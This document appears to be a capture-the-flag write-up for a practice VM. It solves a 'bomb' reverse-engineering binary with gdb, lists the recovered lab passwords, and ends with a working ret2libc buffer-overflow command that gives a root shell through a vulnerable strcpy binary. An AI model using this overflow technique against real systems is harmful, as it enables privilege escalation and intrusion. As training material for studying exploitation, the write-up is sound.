# The second method involves using a bomb file when we log into the server.
### First you need to log in to the server, the description in writeup1.md .
We enter the server

``ssh laurie@172.16.101.128``

``login: laurie``

``password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4``

Checking what lies on the server.

``ls``

The bomb file is a binary, at startup you need to go through several phases to decrypt.

## Playing in a bomb.
First of all, do `` nm bomb`` to get the binary name table.

![
08048b20 T phase_1
08048b48 T phase_2
08048b98 T phase_3
08048ce0 T phase_4
08048d2c T phase_5
08048d98 T phase_6
](/imgs/img2_1.png)

### Decrypting of the first phase.
To decrypt, we need a debugger `` gdb``, we use it on all phases.

``gdb ./bomb``

``(gdb) disass phase_1``

![
0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>
](/imgs/img2_2.png)

We need this line ``0x08048b32 <+18>:	call   0x8049030 <strings_not_equal>``.

``(gdb) x/s 0x80497c0`` -> ``"Public speaking is very easy."``

The first phase is over.

### Decrypting of the second phase.
``(gdb) disass phase_2``
![
0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>
](/imgs/img2_3.png)
We need ``0x08048b5b <+19>:	call   0x8048fd8 <read_six_numbers>``.

``(gdb) x/s 0x08049b1b`` -> ``"%d %d %d %d %d %d"``

Now we know that it should receive 6 digits at the input.

On this line ``0x08048b63 <+27>:	cmpl   $0x1,-0x18(%ebp)`` there is a comparison whether the first number is equal to one. So the first value is 1. Further, by simple selection, we determine the following values.

Values:

``1 - 1``

``2 - 2``

``3 - 6``

``4 - 24``

At this stage, you can determine the logic by which the numbers are built.

``1 - 1`` -> ``1 * 1 = 1``

``2 - 2`` -> ``1 * 2 = 2``

``3 - 6`` -> ``2 * 3 = 6``

``4 - 24`` -> ``6 * 4 = 24``

``5 - 120`` -> ``24 * 5 = 120``

``6 - 720`` -> ``120 * 6 = 720``

The second phase is over.

### Decrypting of the third phase.
``(gdb) disass phase_3``
![
0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>
](/imgs/img2_4.png)

We need this line ``0x08048bb7 <+31>:	call   0x8048860 <sscanf@plt>``, which is recording on this line ``0x08048bb1 <+25>:	push   $0x80497de``

``(gdb) x/s 0x80497de`` -> ``"%d %c %d"``.

Opening the readme can tell you that we need the `b` character.

As a result, we manage to find the option `` 1 b 214``. There were also options `` 7 b 524 `` and `` 2 b 755`` but they did not fit.

The third phase is completed.

### Decrypting of the fourth phase.
``(gdb) disass phase_4``
![
0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>
](/imgs/img2_5.png)

We do the same as we did in the third step. 

We need this line ``0x08048cf6 <+22>:	call   0x8048860 <sscanf@plt>``

Which is recording on this line ``0x08048cf0 <+16>:	push   $0x8049808``

``(gdb) x/s 0x8049808`` -> ``"%d"``

We try different options, `` 42`` and also from `` 1`` to `` 10``. It worked, we need the option `` 9``.

The fourth stage is passed.

### Decrypting of the fifth phase.
``(gdb) disass phase_5``
![
0x08048d3b <+15>:	call   0x8049018 <string_length>
0x08048d40 <+20>:	add    $0x10,%esp
0x08048d43 <+23>:	cmp    $0x6,%eax
](/imgs/img2_6.png)

Here, after reading a little, you can come to the conclusion that at this stage a string of 6 characters is required of us.

Next ``0x08048d7b <+79>:	call   0x8049030 <strings_not_equal>``.

``(gdb) x/s 0x804980b`` -> ``giants``

Next ``0x08048d52 <+38>:	mov    $0x804b220``

``(gdb) x/s 0x804b220`` -> ``"isrveawhobpnutfg\260\001"``

Now we have a pattern and a string to be decoded by a pattern, after long hours of searching we get the result - `` opekmq``.

The idea is that in both words 6 characters each, if you compare the line :

``_abcdefghijklmno``

``pqrstuvwxyz``

``isrveawhobpnutfg``

`g` -> `o`

`i` -> `p`

`a` -> `e`

`n` -> `k`

`t` -> `m`

`s` -> `q`

Decoding of the fifth phase is completed.

### Decrypting of the sixth phase.
``(gdb) disass phase_6``
![
0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>
](/imgs/img2_7.png)

We need this line ``0x08048db3 <+27>:	call   0x8048fd8 <read_six_numbers>``, Now we know that they demand 6 digits from us. After reading how the mechanism is arranged, it can be understood that an array from 1 to 6 is set there, and the input check is performed on the indexes of array 1 - 6. Thus, the correct answer is ``4 2 6 3 1 5``.

The decoding of the sixth phase is over.

## Use
In the readme that lay next to the bomb file there is a description that after completing the game it is worth trying to log in under the login `` thor``. The password consists of composing the result of each phase of the bomb. As a result, we get this result ``Publicspeakingisveryeasy.126241207201b2149opekmq426135``.

As a result:

``login: thor``

``password: Publicspeakingisveryeasy.126241207201b2149opekmq426315``

Trying to log in with this login and password will not work, digging on the intro forum and asking other people that the password should be modified a little ``Publicspeakingisveryeasy.126241207201b2149opekmq426135``

We logged in a server.

## Solving the turtule.
Having entered under the thor we receive two files, README in which it is said that after deciphering the riddle to use the password for the login ``zaz``.

File ``turtule`` which describes the lines and degrees of rotation, in the end we get the word ``SLASH``. If we trying go under 

``login: zaz``

``password: SLASH``

The input does not work, but based on the fact that the previous passwords were hashed, we tried to capture the word in SHA-256, which did not work in MD-5, which gave the result. As a result, we get the password ``646da671ca01bb5d84dbb5fb2238dc8e``.

``login: zaz``

``password: 646da671ca01bb5d84dbb5fb2238dc8e``

## Login with username @zaz.
Having entered under the thor we receive ``exploit_me`` file.

The first thing we do is `` nm exploit_me`` to know what to disassemble.

Now we start the debugger ``gdb ./exploit_me``.

``(gdb) disass main``
![
0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
](/imgs/img2_8.png)

We need this line ``0x08048420 <+44>:	call   0x8048300 <strcpy@plt>`` after reading in the inrnetes we find that it has a vulnerability in the form of a stack overflow. Check.

``./exploit_me $(python -c "print('`' * 140)")`` -> ``Illegal instruction (core dumped)``

Find a description [ret2libc attack](http://shellblade.net/docs/ret2libc.pdf)

Using:
![
](/imgs/img2_9.png)

According to the description, we get a script in the form:

``./exploit_me $(python -c "print('A' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'AAAA' + '\xb7\xf8\xcc\x58'[::-1])") id uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)``

# U are root.

































